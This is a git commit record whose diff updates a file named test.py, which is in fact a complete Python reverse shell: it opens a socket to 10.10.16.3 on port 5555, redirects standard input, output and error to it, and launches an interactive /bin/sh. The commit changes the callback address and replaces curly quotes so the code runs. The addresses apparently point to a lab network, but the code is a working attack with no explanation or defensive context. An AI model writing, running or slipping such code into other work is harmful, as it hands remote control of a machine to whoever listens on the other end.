98e6c17784a6e54471926f7149f4fb49f0299d1a
mrmax4o42 <92962531+mrmax4o42@users.noreply.github.com>
2022-06-19 13:41:39 +0200

    Update test.py

--- test.py
+++ test.py
@@ -1,6 +1,6 @@
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect((“10.10.14.30”,5555))
+s.connect(("10.10.16.3",5555))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);
+os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
